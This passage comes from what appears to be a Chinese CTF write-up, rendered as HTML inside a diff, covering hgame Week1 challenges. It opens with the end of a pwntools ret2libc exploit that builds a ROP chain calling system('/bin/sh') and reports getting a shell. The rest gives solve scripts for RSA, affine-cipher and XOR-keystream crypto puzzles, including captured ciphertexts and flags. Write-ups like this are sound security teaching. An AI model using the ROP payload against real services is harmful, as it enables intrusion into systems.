+SYSTEM <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
+BINSH <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;bin/sh </span><span style="color:#e6db74">%x</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> BINSH)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system </span><span style="color:#e6db74">%x</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> SYSTEM)
+
+payload <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> main_offset
+payload <span style="color:#f92672">+=</span> p64(RET)
+payload <span style="color:#f92672">+=</span> p64(RDI)
+payload <span style="color:#f92672">+=</span> p64(BINSH)
+payload <span style="color:#f92672">+=</span> p64(SYSTEM)
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>interactive()
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p><img src="media/15792383134168/Screen%20Shot%202020-01-21%20at%206.24.42%20PM.png" alt="Screen Shot 2020-01-21 at 6.24.42 P">
+成功拿到shell。
+后续：后来问了出题人，，他说预期是先open再read然后puts，原来open的返回值是有规律的2333。。</p>
+<h5 id="week1-pwn-ak">Week1 Pwn AK</h5>
+<h3 id="0x03-crypto">0x03 Crypto</h3>
+<h4 id="infantrsa">InfantRSA</h4>
+<p>签到题，在复习了一波RSA算法原理之后就知道做法了。
+唯一的问题是让我求解d。。。
+数学公式有点难顶，不过谷歌大法好，找到了别人的代码实现
+改改直接贴了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extended_euclidean_algorithm</span>(a, b):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    extended_euclidean_algorithm(a, b)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    The result is the largest common divisor for a and b.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    :param a: integer number
+</span><span style="color:#e6db74">    :param b: integer number
+</span><span style="color:#e6db74">    :return:  the largest common divisor for a and b
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+
+    <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">else</span>:
+        g, y, x <span style="color:#f92672">=</span> extended_euclidean_algorithm(b <span style="color:#f92672">%</span> a, a)
+        <span style="color:#66d9ef">return</span> g, x <span style="color:#f92672">-</span> (b <span style="color:#f92672">//</span> a) <span style="color:#f92672">*</span> y, y
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modular_inverse</span>(e, t):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    modular_inverse(e, t)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    Counts modular multiplicative inverse for e and t.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    :param e: in this case e is a public key exponent
+</span><span style="color:#e6db74">    :param t: and t is an Euler function
+</span><span style="color:#e6db74">    :return:  the result of modular multiplicative inverse for e and t
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+
+    g, x, y <span style="color:#f92672">=</span> extended_euclidean_algorithm(e, t)
+
+    <span style="color:#66d9ef">if</span> g <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Modular inverse does not exist&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> x <span style="color:#f92672">%</span> t
+        
+
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">681782737450022065655472455411</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">675274897132088253519831953441</span>
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+n <span style="color:#f92672">=</span> p<span style="color:#f92672">*</span>q
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">275698465082361070145173688411496311542172902608559859019841</span>
+o <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+d <span style="color:#f92672">=</span> modular_inverse(e, o)
+m <span style="color:#f92672">=</span> pow(c, d, n)
+<span style="color:#66d9ef">print</span>(m)
+<span style="color:#66d9ef">print</span>(hex(<span style="color:#ae81ff">256</span>))
+n <span style="color:#f92672">=</span> m 
+b <span style="color:#f92672">=</span> n<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">30</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
+<span style="color:#66d9ef">print</span>(b)
+</code></pre></div><p>运行后得到flag</p>
+<h4 id="affine">Affine</h4>
+<p>代码有点乱2333
+基本思路就是先求出A、B的可能解，因为知道<code>A8I5z{</code>对应的是<code>hgame{</code>，所以只要枚举几次就知道了，我是枚举了[0..100]的整数，然后取了A=13、B=14其中一组。
+接着只要拿<code>TABLE</code>用算法枚举倒推出原文就行了，如下面代码所示</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<span style="color:#f92672">import</span> gmpy2
+<span style="color:#75715e">##from secret import A, B, flag</span>
+A <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+B <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hgame{xr1A_J7ha_vG_TpH410}&#39;</span>
+
+<span style="color:#66d9ef">assert</span> flag<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;hgame{&#39;</span>) <span style="color:#f92672">and</span> flag<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#39;}&#39;</span>)
+
+TABLE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
+MOD <span style="color:#f92672">=</span> len(TABLE)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;MOD length: &#34;</span>, MOD)
+
+cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> flag:
+    i <span style="color:#f92672">=</span> TABLE<span style="color:#f92672">.</span>find(b)
+    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+        cipher <span style="color:#f92672">+=</span> b
+    <span style="color:#66d9ef">else</span>:
+        ii <span style="color:#f92672">=</span> (A<span style="color:#f92672">*</span>i <span style="color:#f92672">+</span> B) <span style="color:#f92672">%</span> MOD <span style="color:#75715e"># 62</span>
+        cipher <span style="color:#f92672">+=</span> TABLE[ii]
+
+<span style="color:#66d9ef">print</span>(cipher)
+<span style="color:#75715e">## A8I5z{xr1A_J7ha_vG_TpH410}</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">e</span>(A, B):
+    cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> flag[:<span style="color:#ae81ff">6</span>]:
+        i <span style="color:#f92672">=</span> TABLE<span style="color:#f92672">.</span>find(b)
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+            cipher <span style="color:#f92672">+=</span> b
+        <span style="color:#66d9ef">else</span>:
+            ii <span style="color:#f92672">=</span> (A<span style="color:#f92672">*</span>i <span style="color:#f92672">+</span> B) <span style="color:#f92672">%</span> MOD
+            cipher <span style="color:#f92672">+=</span> TABLE[ii]
+    <span style="color:#66d9ef">return</span> cipher
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">d</span>(A, B):
+    <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;A8I5z{xr1A_J7ha_vG_TpH410}&#39;</span>:
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> TABLE:
+            <span style="color:#66d9ef">print</span>(t, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(TABLE)):
+                <span style="color:#66d9ef">if</span> TABLE[(A<span style="color:#f92672">*</span>i <span style="color:#f92672">+</span> B) <span style="color:#f92672">%</span> MOD] <span style="color:#f92672">==</span> t:
+                    <span style="color:#66d9ef">print</span>(TABLE[i], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+                    <span style="color:#66d9ef">break</span>
+        
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    d(A,B)
+
+main()
+</code></pre></div><p>结果瞬间出来，拿到flag</p>
+<h4 id="not_one-time">not_One-time</h4>
+<p>这题比较有意思。
+因为keystream是随机的，所以不可能通过暴力算法求解出答案。
+题目<code>not_One-time</code>就很贴切了。
+首先做法是算出flag的长度，因为每次的结果都是等长的base64输出，而结果又是flag和keystream每一位异或得到的，所以很容易知道flag_len的值。
+接着就是最好玩的部分了，因为<code>A^B^B == A</code>，而异或的位又是来自一串固定的TABLE，即<code>string.ascii_letters+string.digits</code>，所以只要倒推一遍就知道该位的原字符是啥，但它有<code>len(string.ascii_letters+string.digits)</code>种可能。再又来，因为原文是固定的，所以只要结果（样本）足够多，那么该位原字符出现频率也越高，那么是原字符的概率也越高。于是用脚本获取了100个结果（当时不知道够不够，就先试试），然后跑了一遍，flag就出来了。
+从前几位的<code>hgame{</code>也能证明每一位原字符推算的正确性。
+代码如下，有点乱。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> random
+<span style="color:#f92672">import</span> string<span style="color:#f92672">,</span> binascii<span style="color:#f92672">,</span> base64
+
+
+<span style="color:#75715e">## from secret import flag</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}&#39;</span>
+<span style="color:#66d9ef">assert</span> flag<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{&#39;</span>) <span style="color:#f92672">and</span> flag<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>)
+
+flag_len <span style="color:#f92672">=</span> len(flag)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;flag_len:&#39;</span>, flag_len)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(s1, s2):
+    <span style="color:#75715e">#assert len(s1)==len(s2)</span>
+    <span style="color:#66d9ef">return</span> bytes( map( (<span style="color:#66d9ef">lambda</span> x: x[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">^</span>x[<span style="color:#ae81ff">1</span>]), zip(s1, s2) ) )
+
+random<span style="color:#f92672">.</span>seed( os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">8</span>) )
+keystream <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join( [ random<span style="color:#f92672">.</span>choice(string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(flag_len) ] )
+keystream <span style="color:#f92672">=</span> keystream<span style="color:#f92672">.</span>encode()
+
+<span style="color:#75715e">##print(keystream)</span>
+
+<span style="color:#66d9ef">print</span>( base64<span style="color:#f92672">.</span>b64encode(xor(flag, keystream))<span style="color:#f92672">.</span>decode() )
+
+exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;BSIkGzIaQQAYF3UbK3koVlN3AyJQSkR/CBARDBgIcScoPwsoG3o+UXYGNw==
+</span><span style="color:#e6db74">BTQmKwtOQXcBMVQWInw7BFdHCg8tZxV3Gx8JUhcxAAs8CQpqQ0c9RiIUNA==
+</span><span style="color:#e6db74">KRUKXwMiG0Y9G0EdFmwUUXVgIiAzYnJBGgcOIyACC11vE3sbfFQZUxscMQ==
+</span><span style="color:#e6db74">ElIoH11LJ34nMmkjd2A9dRxNUT9UXn5xPBYfBx4HB1xrHXIwREJndhAyJw==
+</span><span style="color:#e6db74">OQUKBlwoO1QQP2s7EUM4ZXF6UhUcQhZWDgt8PRQuSRMyL0YJYAUYWilSSQ==
+</span><span style="color:#e6db74">Py0xCi02ClsYNEY7M0UlBkltWB81d1ZLHBMrUEUgUBUxH1tqX2YXXycGJQ==
+</span><span style="color:#e6db74">EhcmDhxJFWsdQ2API0Y3CkVgEiEGS1dwGDcCNycKcRMTHEYqSX03e3oSOA==
+</span><span style="color:#e6db74">OD4IOwwNMQEPHVQKP0gURWx5MjA/X1YTDCtwEzsRZ103B2JqQ3YGYgUSNA==
+</span><span style="color:#e6db74">PSkkKVI/IlAQGUg4FVMDAFQMGQ4ndUwXEiYxLjsJaiMuDkMxY30eXiojOw==
+</span><span style="color:#e6db74">WiIxGCAzImMPIUQaF1sDcUtSAj9WG0kUMEA1Lk0nXDInBGEYWUc4YhRdPg==
+</span><span style="color:#e6db74">ASoSNTMoAmE5PkIoNRh6emIAOQsxfEd1NAcgPR0kehwMJ3opZ0cHByQdCw==
+</span><span style="color:#e6db74">CwkzAQAhRAsYFlU/Ak0oeW1gBBIydXNNByR0IyUZBQdmGUANHUVoQScpKg==
+</span><span style="color:#e6db74">LyoiAyciPkcfJkE4BXF4RlRUF1EySk5nPT8zKREMA1EGM2oRQW8fZwksDQ==
+</span><span style="color:#e6db74">IBYFNCNOG1wsK2teLEp0XVZkDjUjSE9VTkZ9LgAuYQ42XGQqHG9hbnEqMA==
+</span><span style="color:#e6db74">OA0MNVI8HkIEBmgFDGYZY3NkKhUcXlNQHDYEAy8majMpXWM1ZXgedy1WBQ==
+</span><span style="color:#e6db74">WygvGVcpM1lHQWk2CF4kXnFXNywcQFRRDj8iXC9wSi0JAFgvaQEffhFQLw==
+</span><span style="color:#e6db74">HhYlWicCIUMbQ2YLfk8JWHAMIgtUXRIQPysDARIGSwwbMlITHWwAeCAHDg==
+</span><span style="color:#e6db74">ABUHWldOHVVNGl8jJmQ3BkkCAjQLZ2QQByEyECUod1RoMXtpaHMSdRtTPA==
+</span><span style="color:#e6db74">PSYyPxISN3syK0U5DXoHZX4NDygOG1xeM0c3MEURfS0GOkEzfG8Tey8gTw==
+</span><span style="color:#e6db74">JDNYXjErKFk4GmIDK3srdkxFD18MSWlMFTMQLD0hXhQqOX4oSnYJcwdRGg==
+</span><span style="color:#e6db74">XyIlCBUiREoDHGNdL0g+QF14JjQ/aERRPCQRNC8MCjcKDgRqSFg0YXdUMw==
+</span><span style="color:#e6db74">LRYNGiEyA0cQNQcJCXh/exVeLjEnSXxkGj8yCDkQYTQMLl5uS0xjQhtSRQ==
+</span><span style="color:#e6db74">Lw81ODMTFgRBEn1bBXkdeHQAFxMpQWxiPzk/PA9weAdoI38WRH07VXUTTg==
+</span><span style="color:#e6db74">IFA4XQ06E3U/IlMIH2R5BmVWAAYidFVJGh8uNTo5ai5nHUUYYVtmXQwLCw==
+</span><span style="color:#e6db74">XVBRIjFDM3oAFmMDcBknCnACAxc3XVwTNCIjATcvVBNqMgsyWww9RigLLA==
+</span><span style="color:#e6db74">IDcoBzE9RwUwA2EiNlwDe1NTAyYCYktFBDMLARAOX1YoGwIoWGEbXA0PNA==
+</span><span style="color:#e6db74">GCUVJCgWJl4iBV9aMX4rB3NnFTUCR25LOwR8Vj4sRyxmEkMWH2AKcQ9cCg==
+</span><span style="color:#e6db74">ODAiAFY8IlkWJ1ooPXsMXW10LzMdVHBEKTArKCwPf10vJgM3d1E7Zw8ORA==
+</span><span style="color:#e6db74">X1cCJi0DO0UmKnZeP2cYcGpCBF4JaE5cEBl3KSUbSSgHPUo4HF0iBAs9CA==
+</span><span style="color:#e6db74">Mh0LPhUtP2AwNn8ZK2IVA2lXDCAyWXRTRhYqDCMlaVMcDX4JalplexJUBw==
+</span><span style="color:#e6db74">Dx5SAwEdA1EmK0UcEBoKe1ZmFhEdXnFMDgctFTANQx4LDXxubH06eA4RSw==
+</span><span style="color:#e6db74">WT0zJRUvA2s0MHk6HWIUeU5NBxULaG5OCTocUzEECisnOEpoe3lnTi4TMw==
+</span><span style="color:#e6db74">XR5QLxUKEHEzFEMHBlEjd3dmElEsXWhFGgYILx0MVykuAV0vHlonBzQSLg==
+</span><span style="color:#e6db74">Ch43WBcfBWoDN3o9H0o0QkYFOwgMdWluCxMLXT4OAgloMXAteX06dw4cCA==
+</span><span style="color:#e6db74">Bj8qCVArAlIhG1ohNUEUZxB6MF5Rbl9KGwUOKCR7YQwQPAAcfQM0eicTFA==
+</span><span style="color:#e6db74">IQsmJhYfKn1EKgMvBGwgcHBsNAkNQWAfPSt9IAAnQgJsHGcvGGAHV3IBEg==
+</span><span style="color:#e6db74">B18IIDxJF1gEBVYpE30UBmd+DQQWGkQSKyspLDQNVlw5CEQvYmwjWRAPNg==
+</span><span style="color:#e6db74">MlQFJSEpPAE3A0koKlMaVR1sUiETf0xJTBc/LBE6cQI+H0kjZQM/djtdKA==
+</span><span style="color:#e6db74">OzYTChwURAAGMlAFA3kqZ3FXKiEtbExREiQQVCQifw8lDmQSHHwBRRZUBA==
+</span><span style="color:#e6db74">GCNROggIHAAlSkYKLWMrBmJSGBIzYWwUKws8NBMhUCkFU1doWXY0YhcsCg==
+</span><span style="color:#e6db74">WQULBRU+QVwUFQcqIkMufnEAFC8Ual5MJAMiC0wbZy8lHgoMa1whViE/Fg==
+</span><span style="color:#e6db74">LigZPRwfJ2QGBH4vckoeaUt2WCQMTk5eFRgoEjA5fFQvJ3svRm0pAncOPw==
+</span><span style="color:#e6db74">JQsPLFAzGAQBFQYUFnMLfxJ8OyJRSHxKSj19Kkc7azMME0k8ZAYAU3UzMQ==
+</span><span style="color:#e6db74">DRERBTUcPV9MElleFUM/f0dkJzYiSlBuKig3DAwofBMpBmtta1ggATscDw==
+</span><span style="color:#e6db74">Ago2Az01JQZMCXUGf3s1A0hwUx9dFHZfOB4gPU0KXhcrLGIebHw2YzoQMA==
+</span><span style="color:#e6db74">MVVTAitICAUUHFpeA385SW8EVx0AfXRCP0U8CEE2chE3XApoRVdlBDYjPg==
+</span><span style="color:#e6db74">IyEPGlVNHFhEFkM0DBMCWWpBVSUuQ2l/KCgALThwBjcQP3A8S1Y9ci8zCQ==
+</span><span style="color:#e6db74">W18zCyoJB0sUQX1aK0ovWEdFJy5WaRZyKioOEy8uCgkqMwUeZHIZQHsBRA==
+</span><span style="color:#e6db74">WDUrBT00InEzIXQPdUkcaxR9EhcPaVVhLR82NjoIVR4aA0IfSAc2fypXMA==
+</span><span style="color:#e6db74">Dj4YJiYjM0M8MFkMKhkjC0V+BTdca3d/KEAVHScNVwoVWng6fk8Ffho/OQ==
+</span><span style="color:#e6db74">JQkpHlUUQQJEF184Ik1/dEplIAYfFU9QJkc1FBo1dA8VE1oua0JmQjsmEQ==
+</span><span style="color:#e6db74">GR0sOzIKNF48MXM+E0YOW0dDNDMIQ1ERDTR9VhYoYAkwLWIqV2YDZg43GQ==
+</span><span style="color:#e6db74">XCMCXCEwNl1MOVY/Fhl5RW5WDC82WF5uBxx8PkVzWwMbEVsseFcbdxMTTg==
+</span><span style="color:#e6db74">KhIkIhwCHEJHHUgoFE46dkB4DykMflRVSCIpXScrCzVqBWErGAc8VzExHg==
+</span><span style="color:#e6db74">WVQMKFMtR3cMJFQ5EUV4anFPGF8WVX9OSSIJLD41cAAcJWYVd0QfBhcVFA==
+</span><span style="color:#e6db74">DVUNDCIzP3YyIEsNERIBdmcEOAk8YG9gJjMfISETdxMGIAQKZnMKcHodGg==
+</span><span style="color:#e6db74">IV5VCVAVK0ICQ0k3P2YIRxNADVUXXWNsOyIIPT4PUg45P1ggWVwcbBoARA==
+</span><span style="color:#e6db74">OFEmBVZIOnlCMWY+BmEiVlBQBSk2aGwfHDQWHg83QVw9HEEqT1dmfSpQGA==
+</span><span style="color:#e6db74">LQUVDioROFwPEQgJL1MqVXxHB1QIYGFsSR8LFkMIcisVJ1tuG00fVgQkDg==
+</span><span style="color:#e6db74">USUFPxAeFH4BO3ZeA38OVmhCDjQ1f0N0Hyo8PDF2WxUpJnJtam8dYw5TMA==
+</span><span style="color:#e6db74">XBUjDC5IBnIYS3AYE1oDdxJlDwFUWX5LNiInUT12cVNsBFZgfHgjTAoCCA==
+</span><span style="color:#e6db74">IFJQKQ4oN3o9Gn0vEGE4dBNyAx0dalUUMzUQNjYRRQc6U1QMeX4FVxQIMg==
+</span><span style="color:#e6db74">MV4GIgYSAQIAHFcncGwJZVRhByQNfU5NHBMkUTYXdlMLU3wNXXw2cjEODQ==
+</span><span style="color:#e6db74">WAUuFF0zS1QfAn1eFh8de1RMVgBdax9rOCA0JTlzQh4uOgA6HUEATnsDOw==
+</span><span style="color:#e6db74">MTQjABI5KAA8EmgJDkI8en5xNhQMeBBeKwc2AxMvajJrPGkrXWwlQywrLw==
+</span><span style="color:#e6db74">BgsqHzMxQEkBBAEUKWQ4chVSEw83ZU5STyY2LAx2ZgoTXms8fFoyQjE8EA==
+</span><span style="color:#e6db74">LTIYCiEXCmFDFkIiMVwlaU5gFF8Gb1xLPCs1NkwOfV0eG1gBQV5hRA0zNQ==
+</span><span style="color:#e6db74">GBJVKTYJFV0PJgYWdmF5R0F7MQoWW3FSDzp1KgAGBVFpHEoKfH41ATQoDQ==
+</span><span style="color:#e6db74">IjQwVCcyA1oPNwIAFGF5X1NtEwQrGndsM0E/Azl6VwYaDXYgH1xlfwccDQ==
+</span><span style="color:#e6db74">ICgXKD9CMwICPVAeEkIAWWV4ADUyGRRJBCMhMTALWgU4In4xZW0qZTs2GA==
+</span><span style="color:#e6db74">HlULHRdIHwQvGXg8cFojRUsAESMnXW5PCT0qHiICRyNqIQYYbGYnVwUVDQ==
+</span><span style="color:#e6db74">UDMyOjABB1I/PV4vAGMKSUViLwU/T1VDHBgIDxkoVykwP3kNRQRmBikqSA==
+</span><span style="color:#e6db74">DDATOwIBHAMwRXkFfxp7AWIEJiVdfFMRNDMABQcNSw8IDmYsZnASZSYMCw==
+</span><span style="color:#e6db74">Dz8QXSo2NgMgJwQBN2N6AU1XClJSaV52GTgAUzohVBZmBFkra2U7bg1TSA==
+</span><span style="color:#e6db74">IwYEHgswIAc2BHMYH3oYflBlWSRcS2lfSAggCSMbeT4MOUkxSXkjYXpSEQ==
+</span><span style="color:#e6db74">Pi1SO1QxGmAcGlkjKVE/QF5UODISYVV8TQYrKj0XXjEcGkEYTkIaBXo2Hw==
+</span><span style="color:#e6db74">AjUCLwRNHEFCBAAjHUc/XVxcMw9UQUVoSTcuNBcTRlIYDEQuZH4GeAQiKQ==
+</span><span style="color:#e6db74">Oxc7VSk8PQQEK0ddMnorZVdlACk9ZFZSKD9yXTwCQDBtU0kzWgQUTTEwPw==
+</span><span style="color:#e6db74">KwoyBlVOEGIFR0IHAkJ1S0tWClMiR0xHFEsCJwVySxdsUgYxZWE3UBQGOQ==
+</span><span style="color:#e6db74">LyUuWQk9Ol9HKXsdK34EV0cANC9dR3cfCxoJBQACBjQPPAU8VVxicDsqNg==
+</span><span style="color:#e6db74">OwMkAi8UJ3sxIgEvE0IBX2N7CAoLeBNUHBoSDyEzRiMzCnAUFVIyYxUdDA==
+</span><span style="color:#e6db74">ABIPIxMzKlc8SmsaEkcIWWd4NQYvSh9FBzkvLB43RzUxEUUSXXJgQTsDCA==
+</span><span style="color:#e6db74">EgYPFSwdJH8kQWE5HkI8QmBPODAVG2NvCiByPTl0VlAyUwMtalk/WgstEg==
+</span><span style="color:#e6db74">Eh47GAIpP38PBlYsKVl/SUFeACIuZ0QWSRMNVCQbCgknP3BsH0YiRHBWGA==
+</span><span style="color:#e6db74">LhMvKg5OQF1FS1k6IEoufEddBQBVSXRtBxUfDjwOfhUqB3AxFWQ7BiktFw==
+</span><span style="color:#e6db74">BxAFWjE5AQEdPVsvP0wgBmZXFFQHaWp1CEAUJTYyBh0+XVERZXA2Q3EyCg==
+</span><span style="color:#e6db74">CxECHQwsBWETKmM9cH0oWUZgKDVddUdLT0MOKkMTfjE2LEJreF9mBycDKQ==
+</span><span style="color:#e6db74">OCwKOC0iAgo4FQEmNh0KVBdhFygCRkdyHRg/JkArYQcWPVQOdEM1XBIqCA==
+</span><span style="color:#e6db74">Ih1QH1U3NQEwCQA8AGwDdGlcADUWbGhBPxooNxksdgwJD0ote2EYbnQ3CQ==
+</span><span style="color:#e6db74">DhcqPh88GEE5JGEpKloee2UGMyYkG2NKLQECEhYyYg0OCgBhX0cTZBUPCg==
+</span><span style="color:#e6db74">DQsCAQ0oBUYdRUdeE3wKV1JtDBIKRHd0RjoyEDokUFRpEmtpGWI4X3YOMA==
+</span><span style="color:#e6db74">PhVRCFUeBGQ7QkY3LGMCdBBbMAs9XxVsOkcPJwItBgElX3YjTFcbTTMsOA==
+</span><span style="color:#e6db74">Igs3OQs3R1I8J0sWcBs+ZXRjUwMMGVJPCDk0PR4VCw8pDWE8HEY+ZRYrEw==
+</span><span style="color:#e6db74">IR8FVAghGHkTHHorAkAkd0NvFDAvaBYXTyo1VyMqYgcLOkJpb38feBMRGw==
+</span><span style="color:#e6db74">BFdQBSEjG18AH3JdCBwGSXUNGTIEHFFhRh8PFBsVXg8GHgQsekU/ARc9Sw==
+</span><span style="color:#e6db74">OjBSIwJIBEAvRFsMFB4DfmJTKyInfXdQMBk1XDcXBhMHPnwaSHYSVw4xOw==
+</span><span style="color:#e6db74">WwMkPxABK31GGXQiA1p7VEpzNQstan9cCT01Iy8nYTIHJ0drVFk4WHEoRA==
+</span><span style="color:#e6db74">I14wCg4aPX5ACQddInF1YFNZMQ8NfkwVDgMqLTsaWx5mO0Q3ZgUSeTcIOg==
+</span><span style="color:#e6db74">KxBWAB0wKgYjBwIWJXg5QRJMFA8NHm8SEUYtMBc1AF0mEQs0aVIHcyQ1CA==
+</span><span style="color:#e6db74">LgoRIV0+GUEEAUAEf1gscklWCBBcWFZgEBAEARA7Uh0HL0UTGAATAjAJSg==
+</span><span style="color:#e6db74">AjYOJioCBVhFRHAAPWwHQ2l3LCYDZXBADAdyEUItW1w4PH4pHFE4UiIAGg==
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+
+TABLE <span style="color:#f92672">=</span> (string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits)<span style="color:#f92672">.</span>encode()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(j):
+    s <span style="color:#f92672">=</span> None
+    <span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> exp:
+        b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(e)
+        x <span style="color:#f92672">=</span> b[j]
+        i <span style="color:#f92672">=</span> set([chr(x<span style="color:#f92672">^</span>i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> TABLE <span style="color:#66d9ef">if</span> chr(x<span style="color:#f92672">^</span>i) <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable])
+        <span style="color:#66d9ef">if</span> s:
+            s <span style="color:#f92672">=</span> s<span style="color:#f92672">&amp;</span>i
+        <span style="color:#66d9ef">else</span>:
+            s <span style="color:#f92672">=</span> i
+    <span style="color:#66d9ef">return</span> s
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(flag_len):
+        <span style="color:#66d9ef">print</span>(tuple(f(i))[<span style="color:#ae81ff">0</span>], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#66d9ef">print</span>()
+
+main()
+</code></pre></div><h4 id="reorder">Reorder</h4>
+<p>刚开始看这道题一脸懵逼，然后多试了几次，发现每十次输入会出来一串如<code>pLaIjhg+{e5m$Umt!}Pnu3_imR0!ATeT</code>奇怪的东西，看着有点像flag。
+再结合题目仔细看一下，发现应该是个移位加密，输入与输出有映射关系。
